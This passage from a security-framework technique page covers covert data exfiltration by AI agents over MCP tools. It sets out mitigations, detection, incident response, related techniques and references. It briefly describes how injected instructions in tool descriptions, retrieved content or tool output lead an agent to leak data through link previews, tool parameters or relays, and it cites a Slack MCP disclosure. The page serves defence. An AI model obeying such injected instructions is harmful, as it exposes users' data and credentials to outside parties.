1. Apply [SAF-M-69: Out-of-Band Authorization](../../mitigations/SAF-M-69/README.md) and [SAF-M-22: Semantic Output Validation](../../mitigations/SAF-M-22/README.md): show the complete tool description, destination, and arguments before sensitive operations; require meaningful approval and validate tool results before returning them to the model. [MCP Tools security considerations](https://modelcontextprotocol.io/specification/2025-06-18/server/tools) <!-- SAF-TRACE: claims=SAF-T1910-C015; sources=SRC-mcp-tools-2025-06-18 -->
2. Apply [SAF-M-16: Token Scope Limiting](../../mitigations/SAF-M-16/README.md), [SAF-M-29: Explicit Privilege Boundaries](../../mitigations/SAF-M-29/README.md), and [SAF-M-74: Per-Invocation Capability Brokering](../../mitigations/SAF-M-74/README.md): minimize file, credential, scope, and network privileges for each server and isolate cross-server data flows at the host. [MCP Security Best Practices](https://modelcontextprotocol.io/docs/2025-11-25/tutorials/security/security_best_practices) <!-- SAF-TRACE: claims=SAF-T1910-C001,SAF-T1910-C016; sources=SRC-mcp-architecture-2025-06-18,SRC-mcp-security-2025-11-25,SRC-mitre-attack-t1048-v1.6 -->
3. Apply [SAF-M-72: Data Loss Prevention on Tool Outputs](../../mitigations/SAF-M-72/README.md): disable automatic link and media unfurling for agent-posted messages unless explicitly required, and restrict permitted external destinations. [Slack chat.postMessage](https://docs.slack.dev/reference/methods/chat.postMessage/) <!-- SAF-TRACE: claims=SAF-T1910-C008,SAF-T1910-C010,SAF-T1910-C016; sources=SRC-slack-chat-postmessage,SRC-cve-34072,SRC-mitre-attack-t1048-v1.6 -->

### Detective Controls

1. Apply [SAF-M-12: Audit Logging](../../mitigations/SAF-M-12/README.md): retain complete tool-call and approval records and correlate them with sensitive-access and downstream egress telemetry. [MCP Tools security considerations](https://modelcontextprotocol.io/specification/2025-06-18/server/tools) <!-- SAF-TRACE: claims=SAF-T1910-C002,SAF-T1910-C011,SAF-T1910-C015; sources=SRC-mcp-tools-2025-06-18,SRC-cve-34072,SRC-mitre-attack-t1048-v1.6 -->
2. Apply SAF-M-72 and [SAF-M-70: Tool-Invocation Anomaly Detection](../../mitigations/SAF-M-70/README.md): inspect agent and proxy egress, then baseline legitimate external service use to tune alerts. [ATT&CK T1048](https://attack.mitre.org/techniques/T1048/) <!-- SAF-TRACE: claims=SAF-T1910-C014,SAF-T1910-C016; sources=SRC-mitre-attack-t1048-v1.6,SRC-slack-chat-postmessage -->

### Response Procedures

#### Immediate Actions

- Suspend the affected agent session and unapproved egress path, preserving full tool-call, approval, application, and network records. [MCP audit guidance](https://modelcontextprotocol.io/specification/2025-06-18/server/tools) <!-- SAF-TRACE: claims=SAF-T1910-C002,SAF-T1910-C011,SAF-T1910-C015; sources=SRC-mcp-tools-2025-06-18,SRC-cve-34072,SRC-mitre-attack-t1048-v1.6 -->
- Revoke or rotate any credential whose fingerprint or value appears in the carrier, and reduce the data and network permissions of involved servers. [MCP Security Best Practices](https://modelcontextprotocol.io/docs/2025-11-25/tutorials/security/security_best_practices) <!-- SAF-TRACE: claims=SAF-T1910-C016,SAF-T1910-C019; sources=SRC-mcp-security-2025-11-25,SRC-mitre-attack-t1048-v1.6,SRC-radosevich-halloran-mcp-audit-2025 -->

#### Investigation Steps

- Reconstruct the same-session sequence from sensitive access through carrier construction, MCP action, and any secondary fetch; identify all destinations and repeated previews. [Slack MCP disclosure](https://embracethered.com/blog/posts/2025/security-advisory-anthropic-slack-mcp-server-data-leakage/) <!-- SAF-TRACE: claims=SAF-T1910-C008,SAF-T1910-C011,SAF-T1910-C013; sources=SRC-cve-34072,SRC-mcp-tools-2025-06-18,SRC-mitre-attack-t1048-v1.6 -->
- Determine whether the influence came from a server description, retrieved content, or tool output, and separate that delivery behavior from the completed transfer. [Selected experiments](https://invariantlabs.ai/blog/whatsapp-mcp-exploited) <!-- SAF-TRACE: claims=SAF-T1910-C004,SAF-T1910-C006,SAF-T1910-C007; sources=SRC-invariant-tpa-2025-04-01,SRC-invariant-whatsapp-mcp-2025-04-07,SRC-radosevich-halloran-mcp-audit-2025 -->

#### Remediation

- Remove or update the unsafe server or workflow, disable unnecessary downstream side effects, and enforce full destination and payload review for sensitive actions. [CVE-2025-34072 disclosure](https://embracethered.com/blog/posts/2025/security-advisory-anthropic-slack-mcp-server-data-leakage/) <!-- SAF-TRACE: claims=SAF-T1910-C008,SAF-T1910-C010,SAF-T1910-C015,SAF-T1910-C016; sources=SRC-cve-34072,SRC-slack-chat-postmessage,SRC-mcp-tools-2025-06-18,SRC-mcp-security-2025-11-25 -->
- Add a sanitized regression case for the observed carrier and verify both prevention and cross-source detection before restoring automation. [Detection tests](test_detection_rule.py)

## Related Techniques

| Technique | Relationship | Distinction |
| --- | --- | --- |
| [SAF-T1102: Prompt Injection (Multiple Vectors)](../SAF-T1102/README.md) | Prerequisite or co-occurring | Covers adversarial instruction delivery or model influence; SAF-T1910 requires selected data to cross through a covert carrier. <!-- SAF-TRACE: claims=SAF-T1910-C003,SAF-T1910-C020; sources=SRC-invariant-tpa-2025-04-01,SRC-invariant-whatsapp-mcp-2025-04-07,SRC-agentdojo-2406.13352v3 --> |
| [SAF-T1902: Response-Borne Covert Channel](../SAF-T1902/README.md) | Specialization | Requires the covert carrier to be embedded in a response-processing, rendering, or relay path. [Framework Model v2 taxonomy review](../../research/taxonomy-review.yml) |
| [SAF-T1911: Parameter Exfiltration](../SAF-T1911/README.md) | Specialization | Uses a tool or protocol parameter as the carrier; SAF-T1910 also includes application messages, URLs, and downstream service side effects. [Framework Model v2 taxonomy review](../../research/taxonomy-review.yml) |
| [SAF-T1912: Stego Response Exfil](../SAF-T1912/README.md) | Deprecated compatibility ID | Its frozen response-borne carrier contract is consolidated into SAF-T1902; use SAF-T1902 for new mappings. [Framework Model v2 taxonomy review](../../research/taxonomy-review.yml) |
| [SAF-T1913: HTTP POST Exfil](../SAF-T1913/README.md) | Specialization | Requires an HTTP POST request to carry the data outside the authorized boundary. [Framework Model v2 taxonomy review](../../research/taxonomy-review.yml) |
| [SAF-T1914: Tool-to-Tool Exfil](../SAF-T1914/README.md) | Specialization | Requires one tool's output or accessible context to be relayed through another tool to an unauthorized destination. [Framework Model v2 taxonomy review](../../research/taxonomy-review.yml) |

## MITRE ATT&CK Mapping

| ATT&CK ID | Technique | Mapping Type | Rationale |
| --- | --- | --- | --- |
| [T1048](https://attack.mitre.org/techniques/T1048/) | Exfiltration Over Alternative Protocol | Analogous | Both cover data leaving through an alternate protocol or network location; SAF-T1910 additionally requires concealment in an MCP or agent-authorized carrier or secondary service action. <!-- SAF-TRACE: claims=SAF-T1910-C018; sources=SRC-mitre-attack-t1048-v1.6 --> |

## References

1. **SRC-mcp-architecture-2025-06-18**: [MCP Architecture, 2025-06-18](https://modelcontextprotocol.io/specification/2025-06-18/architecture) — Model Context Protocol contributors; host, client, server, and isolation responsibilities.
2. **SRC-mcp-tools-2025-06-18**: [MCP Tools, 2025-06-18](https://modelcontextprotocol.io/specification/2025-06-18/server/tools) — Model Context Protocol contributors; tool definition, call fields, confirmation, validation, and audit guidance.
3. **SRC-mcp-security-2025-11-25**: [MCP Security Best Practices, 2025-11-25](https://modelcontextprotocol.io/docs/2025-11-25/tutorials/security/security_best_practices) — Model Context Protocol contributors; sandbox, least-privilege, and egress constraints.
4. **SRC-invariant-tpa-2025-04-01**: [MCP Security Notification: Tool Poisoning Attacks](https://invariantlabs.ai/blog/mcp-security-notification-tool-poisoning-attacks) — Luca Beurer-Kellner and Marc Fischer, 2025-04-01; hidden-argument and tool-shadowing demonstrations.
5. **SRC-invariant-whatsapp-mcp-2025-04-07**: [WhatsApp MCP Exploited](https://invariantlabs.ai/blog/whatsapp-mcp-exploited) — Luca Beurer-Kellner and Marc Fischer, 2025-04-07; cross-server and tool-output demonstrations.
6. **SRC-radosevich-halloran-mcp-audit-2025**: [MCP Safety Audit: LLMs with the Model Context Protocol Allow Major Security Exploits](https://doi.org/10.48550/arXiv.2504.03767) — Brandon Radosevich and John T. Halloran, v2, 2025-04-11; Leidos-approved public release; RADE experiment and refusal limitations.
7. **SRC-agentdojo-2406.13352v3**: [AgentDojo](https://doi.org/10.48550/arXiv.2406.13352) — Edoardo Debenedetti, Jie Zhang, Mislav Balunovic, Luca Beurer-Kellner, Marc Fischer, and Florian Tramer, v3, 2024-11-24; attack and defense outcome calibration.
8. **SRC-nvd-cve-2025-34072**: [NVD record for CVE-2025-34072](https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2025-34072) — NIST NVD and VulnCheck CNA; affected deployment, description, and proof-of-concept SSVC status.
9. **SRC-cve-34072**: [Security Advisory: Anthropic's Slack MCP Server Vulnerable to Data Exfiltration](https://embracethered.com/blog/posts/2025/security-advisory-anthropic-slack-mcp-server-data-leakage/) — wunderwuzzi, 2025-06-24; responsible disclosure, walkthrough, and mitigation retest.
10. **SRC-vulncheck-cve-2025-34072**: [Anthropic Slack MCP Server Data Exfiltration via Link Unfurling](https://www.vulncheck.com/advisories/anthropic-slack-mcp-server-data-exfiltration) — VulnCheck CNA, 2025-07-01; CVE assignment and credit to wunderwuzzi.
11. **SRC-slack-chat-postmessage**: [Slack `chat.postMessage` documentation](https://docs.slack.dev/reference/methods/chat.postMessage/) — Slack Developer Documentation team; unfurl defaults and suppression fields.
12. **SRC-cisa-kev-2026-09-01**: [CISA Known Exploited Vulnerabilities Catalog, version 2026.09.01](https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json) — CISA KEV team; exact selected-CVE absence check.
13. **SRC-nvd-mcp-keyword-20260902**: [NVD MCP keyword query](https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=Model%20Context%20Protocol&resultsPerPage=2000) — NIST NVD; authoritative vulnerability-coverage pass.
14. **SRC-mitre-attack-t1048-v1.6**: [MITRE ATT&CK T1048](https://attack.mitre.org/techniques/T1048/) — MITRE ATT&CK team; contributors Alfredo Abarca and William Cain; version 1.6, modified 2025-10-24; analogous mapping, controls, and detection strategy.

## Version History

| Version | Date | Changes | Author |
| --- | --- | --- | --- |
| 0.1 | 2026-09-02 | Independent clean-room draft with evidence packet and deterministic detection tests. | OpenAI Codex clean-room agent |
| 0.2 | 2026-09-02 | Reconciled the active exfiltration specializations and deprecated response-carrier compatibility ID. | OpenAI Codex taxonomy review |
